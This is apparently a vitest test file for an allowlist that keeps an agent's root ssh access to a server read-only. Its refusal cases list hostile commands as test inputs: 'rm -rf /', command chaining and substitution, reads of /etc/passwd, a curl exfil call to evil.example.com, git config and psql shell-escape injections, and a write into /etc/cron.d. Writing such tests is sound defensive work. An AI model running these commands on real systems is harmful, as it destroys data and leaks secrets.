// The marsad vps gate is the ONLY boundary between iris and root@marsad-vps — the ssh key
// has no forced command and the remote user is root, so every read-only guarantee lives in
// vetVpsCommand. Fail-closed: anything the allowlist doesn't recognise must be refused.
import { describe, it, expect } from "vitest";
import { vetVpsCommand } from "../src/clients/marsad.js";

const ok = (cmd: string) => expect(vetVpsCommand(cmd), cmd).toEqual({ ok: true });
const no = (cmd: string) => expect(vetVpsCommand(cmd).ok, cmd).toBe(false);

describe("marsad vps read-only gate", () => {
  it("allows the documented read shapes", () => {
    ok("uptime");
    ok("docker compose ps");
    ok("docker logs --tail 100 mention-worker");
    ok("journalctl -u marsad -n 200");
    ok("systemctl status marsad");
    ok("tail -n 50 /var/log/syslog");
    ok("git -C /srv/marsad log --oneline -5");
    ok("ps aux | grep uvicorn");
    ok("psql -U marsad -c 'SELECT count(*) FROM mentions'");
    ok("curl http://localhost:8000/health");
    ok("find /srv -name '*.log' | head -5");
  });

  it("refuses chaining, substitution, redirection, escapes", () => {
    no("uptime; rm -rf /");
    no("uptime && reboot");
    no("cat /etc/passwd > /tmp/x");
    no("echo $(reboot)");
    no("echo `reboot`");
    no("cat /e\\tc/passwd");
    no("uptime\nreboot");
  });

  it("refuses unlisted heads — including in pipe segments", () => {
    no("rm -rf /srv");
    no("reboot");
    no("bash -c uptime");
    no("ssh other-host uptime");
    no("env"); // env would leak secrets
    no("ls | xargs rm");
    no("uptime | sh");
  });

  it("refuses mutating subcommands and flags of allowed heads", () => {
    no("systemctl restart marsad");
    no("docker rm -f mention-worker");
    no("docker compose up -d");
    no("docker exec mention-worker sh");
    no("git -C /srv/marsad push");
    no("git branch -D main");
    no("git remote set-url origin evil");
    no("find / -name x -delete");
    no("find / -name x -exec rm {} +");
    no("journalctl --vacuum-time=1s");
    no("psql -c 'DROP TABLE mentions'");
    no("psql -f /tmp/script.sql");
    no("curl -X POST http://localhost:8000/admin");
    no("curl http://evil.example.com/exfil");
  });

  it("refuses session-hanging follow modes", () => {
    no("tail -f /var/log/syslog");
    no("journalctl -f");
    no("docker logs -f mention-worker");
  });

  it("closes escape vectors inside allowed heads", () => {
    no("awk 'BEGIN{system(\"reboot\")}'");            // awk not allowlisted at all
    no("git -c alias.x=!reboot x");                    // config injection runs a shell command
    no("git -c core.pager=reboot log");
    no("psql -c 'SELECT 1' -c 'DROP TABLE x'");        // second -c must also be vetted
    no("psql -c '\\! reboot'");                         // psql shell escape
    no("psql --command=DELETE");
    no("curl evil.com");                                // schemeless defaults to http, not localhost
    no("curl -o /etc/cron.d/x http://localhost/x");     // writes a file on the box
    no("sort -o /etc/passwd /tmp/x");
    no("git --output=/tmp/x log");
  });

  it("still allows the legitimate variants those checks touch", () => {
    ok("git -C /srv/marsad log --oneline -10");
    ok("git --git-dir=/srv/marsad/.git status");
    ok("psql -U marsad -c 'WITH t AS (SELECT 1) SELECT * FROM t'");
    ok("curl -s http://127.0.0.1:8000/health");
    ok("curl localhost:8000/metrics");
  });
});
